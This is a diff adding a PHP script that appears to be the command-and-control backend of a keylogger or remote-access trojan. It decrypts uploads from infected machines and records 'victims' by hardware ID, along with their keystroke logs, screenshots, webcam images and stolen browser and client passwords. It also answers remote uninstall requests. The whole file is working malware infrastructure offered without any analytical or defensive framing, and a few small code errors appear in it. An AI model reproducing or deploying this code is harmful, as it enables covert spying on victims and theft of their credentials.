@@ -1,0 +1,247 @@
+<?php
+	date_default_timezone_set('America/New_York');
+	if (isset($_POST['p'])){
+		
+		$mykey = "PASTE YOUR KEY HERE";
+		
+		require('config.php');
+		require('mysqli.db.php');
+
+		$array = parse_ini_string_m(Decrypt($_POST['p'], $mykey));
+		
+		$type = $array['type'];
+		$pcname = $array['pcname'];
+		$data = $array['logdata'];
+		
+		$screenshot = '';
+		if(isset($array['screen'])){
+			$screenshot = $array['screen'];
+		}
+		$wb_screen = '';
+		if(isset($array['webcam_link'])){
+			$wb_screen = $array['webcam_link'];
+		}
+		
+		$time = $array['time'];
+		$date = htmlentities(date('Y-m-d H:i:s'));
+		$hwid = $array['hwid'];
+		$ip_add = getUserIP();
+
+		if($type == "passwords"){
+			$array2 = $array['passwords'];
+			$client = $array2['client'];
+			$link = $array2['link'];
+			$username = $array2['username'];
+			$password = $array2['password'];
+		}
+	}else{
+		exit;
+	}
+	
+	$db = new DB($mysql_user,$mysql_password, $mysql_database, $mysql_host);
+	
+	if ($type == 'info' && $hwid != '')
+	{
+		$stmt = $db->select('SELECT * FROM victims WHERE hwid = ? AND pc_name = ?', array($hwid, $pcname), array('%s', '%s') );
+		$row = $stmt->num_rows;
+		
+		if($row < 1)
+		{
+			$db->insert('victims', array( 'hwid' => $hwid, 'pc_name' => $pcname, 'ip_addres' => $ip_add, 'time' => $time, 'status' => 0, 'server_time' => $date, 'add_date' => $date), array('%s', '%s','%s','%s', '%i', '%s', '%s'));
+		}
+	}
+	
+    if ($type == 'keylog' && $data != '' && $hwid != '')
+	{
+		$db->insert('logs', array( 'hwid' => $hwid, 'pc_name' => $pcname, 'ip_addres' => $ip_add, 'time' => $time, 'log' => $data, 'status' => 0, 'server_time' => $date), array('%s', '%s', '%s','%s','%s', '%i', '%s'));
+	}
+
+	if ($type == 'screenshots' && $screenshot != '' && $hwid != '')
+	{
+		$screen_name = date('Y_m_d_H_i_s') . '.jpeg';
+		
+		$db->insert('screens', array( 'hwid' => $hwid, 'pc_name' => $pcname, 'time' => $time,'screen' => $screen_name, 'status' => 0, 'server_time' => $date), array('%s', '%s','%s','%s', '%i', '%s'));
+		
+		$old = umask(0);
+		if (!is_dir('Screens/'.$hwid.'/ScreenShots/')) {
+			mkdir('Screens/'.$hwid.'/ScreenShots/',0755,true);
+		}
+		umask($old);
+		base64_to_jpeg($screenshot, 'Screens/'.$hwid.'/ScreenShots/'.$screen_name);
+		
+		$stmt = $db->select('SELECT screen, screen_id FROM screens WHERE hwid = ? AND pc_name = ? ORDER BY screen_id DESC LIMIT 10, 9999', array($hwid, $pcname), array('%s', '%s') );
+		
+		while($row = $stmt->fetch_array()){
+			if (file_exists('Screens/'.$hwid.'/ScreenShots/'.$row['screen']))
+				unlink('Screens/'.$hwid.'/ScreenShots/'.$row['screen']);
+		}
+		
+		$db2 = new mysqli($mysql_host, $mysql_user, $mysql_password) or die(__LINE__ . ' Invalid connect: ' . mysqli_error());
+		$db2->select_db($mysql_database) or die( "Unable to select database. Run setup first.");
+		$stmt = $db2->prepare("DELETE FROM screens WHERE screen_id NOT IN(SELECT screen_id FROM (SELECT screen_id FROM screens WHERE hwid = ? AND pc_name = ? ORDER BY screen_id DESC LIMIT 10) t)");
+		$stmt->bind_param("ss", $hwid, $pcname);
+		$stmt->execute();
+		$stmt->close();
+		$db2->close();
+	}
+
+	if ($type == 'webcam' && $wb_screen != '' && $hwid != '')
+	{
+		$screen_name = date('Y_m_d_H_i_s') . '.jpeg';
+		
+		$db->insert('webcam', array( 'hwid' => $hwid, 'pc_name' => $pcname, 'time' => $time,'screen' => $screen_name, 'status' => 0, 'server_time' => $date), array('%s', '%s','%s','%s', '%i', '%s'));
+
+		$old = umask(0);
+		if (!is_dir('Screens/'.$hwid.'/Webcams/')) {
+			mkdir('Screens/'.$hwid.'/Webcams/',0755,true);
+		}
+		umask($old);
+		base64_to_jpeg($wb_screen, 'Screens/'.$hwid.'/Webcams/'.$screen_name);
+		
+		$stmt = $db->select('SELECT screen, screen_id FROM webcam WHERE hwid = ? AND pc_name = ? ORDER BY screen_id DESC LIMIT 10, 9999', array($hwid, $pcname), array('%s', '%s') );
+		
+		while($row = $stmt->fetch_array()){
+			if (file_exists('Screens/'.$hwid.'/Webcams/'.$row['screen']))
+				unlink('Screens/'.$hwid.'/Webcams/'.$row['screen']);
+		}
+		
+		$db = new mysqli($mysql_host, $mysql_user, $mysql_password) or die(__LINE__ . ' Invalid connect: ' . mysqli_error());
+		$db->select_db($mysql_database) or die( "Unable to select database. Run setup first.");
+		$stmt = $db->prepare("DELETE FROM webcam WHERE screen_id NOT IN(SELECT screen_id FROM (SELECT screend_id FROM webcam WHERE hwid = ? AND pc_name = ? ORDER BY screen_id DESC LIMIT 10) t)");
+		$stmt->bind_param("ss", $hwid, $pcname);
+		$stmt->execute();
+		$stmt->close();
+		$db->close();
+	}
+
+	if ($type == 'passwords' && $hwid != '')
+	{
+		$db_2 = new mysqli($mysql_host, $mysql_user, $mysql_password) or die(__LINE__ . ' Invalid connect: ' . mysqli_error());
+		$db_2->select_db($mysql_database) or die( "Unable to select database. Run setup first.");
+		$stmt_2 = $db_2->prepare("INSERT INTO passwords(hwid, pc_name, client, host, username, pwd, time, server_time, status) VALUES (?,?,?,?,?,?,?,?,?)");
+		
+		for($i = 0; $i < sizeof($username); $i++){
+			$sLink = substr(urldecode($link[$i]), 0, 99);
+			$sClient = $client[$i];
+			$sUsername = urldecode($username[$i]);
+			$sPassword = urldecode($password[$i]);
+			$stmt = $db->select('SELECT * FROM passwords WHERE hwid = ? AND client= ? AND host= ? AND username= ? AND pwd= ?', array($hwid, $sClient, $sLink, $sUsername, $sPassword), array('%s', '%s','%s','%s', '%s'));
+			$num_row = $stmt->num_rows;
+			
+			if($num_row < 1)
+			{
+				$stmt_2->bind_param("ssssssssi", $hwid, $pcname, $sClient, $sLink, $sUsername, $sPassword,	$time, $date, $status);
+				$stmt_2->execute();
+			}
+		}
+	}
+	
+	if ($type == 'update' && $hwid != '')
+	{
+		$db->update('victims', array( 'ip_addres' => $ip_add, 'time' => $time, 'server_time' => $date ), array('%s', '%s', '%s%'), array('hwid' => $hwid), array('%s'));
+	}
+	
+	if($type == 'uninstall' && $hwid != ''){
+		
+		$stmt = $db->select("SELECT status FROM uninstall WHERE hwid = ?", array($hwid), array('%s'));
+		$num_row = $stmt->num_rows;
+
+		if($num_row > 1)
+		{
+			echo "uninstall";
+			$db->delete('uninstall','hwid', $hwid);
+		}
+	}
+	
+	function base64_to_jpeg($base64_string, $output_file) {
+		$ifp = fopen( $output_file, "wb" ); 
+		fwrite( $ifp, base64_decode( $base64_string) ); 
+		fclose( $ifp ); 
+		return( $output_file ); 
+	}
+	
+	function getUserIP() {
+		if( array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
+			if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',')>0) {
+				$addr = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
+				return trim($addr[0]);
+			} else {
+				return $_SERVER['HTTP_X_FORWARDED_FOR'];
+			}
+		}
+		else {
+			return $_SERVER['REMOTE_ADDR'];
+		}
+	}
+	
+	function Decrypt($data, $secret)
+	{
+		$key = md5(utf8_encode($secret), true);
+		$key .= substr($key, 0, 8);
+		
+		$encrypt_text = base64_decode($data);
+        $clear_text = openssl_decrypt($encrypt_text, "DES-EDE3", $key, OPENSSL_RAW_DATA, "");
+        return $clear_text;
+	}
+
+	function parse_ini_string_m($str) {
+    
+		if(empty($str)) return false;
+
+		$lines = explode("\n", $str);
+		$ret = Array();
+		$inside_section = false;
+
+		foreach($lines as $line) {
+			
+			$line = trim($line);
+
+			if(!$line || $line[0] == "#" || $line[0] == ";") continue;
+			
+			if($line[0] == "[" && $endIdx = strpos($line, "]")){
+				$inside_section = substr($line, 1, $endIdx-1);
+				continue;
+			}
+
+			if(!strpos($line, '=')) continue;
+
+			$tmp = explode("=", $line, 2);
+
+			if($inside_section) {
+				
+				$key = rtrim($tmp[0]);
+				$value = ltrim($tmp[1]);
+
+				if(preg_match("/^\".*\"$/", $value) || preg_match("/^'.*'$/", $value)) {
+					$value = mb_substr($value, 1, mb_strlen($value) - 2);
+				}
+
+				$t = preg_match("^\[(.*?)\]^", $key, $matches);
+				if(!empty($matches) && isset($matches[0])) {
+
+					$arr_name = preg_replace('#\[(.*?)\]#is', '', $key);
+
+					if(!isset($ret[$inside_section][$arr_name]) || !is_array($ret[$inside_section][$arr_name])) {
+						$ret[$inside_section][$arr_name] = array();
+					}
+
+					if(isset($matches[1]) && !empty($matches[1])) {
+						$ret[$inside_section][$arr_name][$matches[1]] = $value;
+					} else {
+						$ret[$inside_section][$arr_name][] = $value;
+					}
+
+				} else {
+					$ret[$inside_section][trim($tmp[0])] = $value;
+				}            
+
+			} else {
+				
+				$ret[trim($tmp[0])] = ltrim($tmp[1]);
+
+			}
+		}
+		return $ret;
+	}
+
+?>
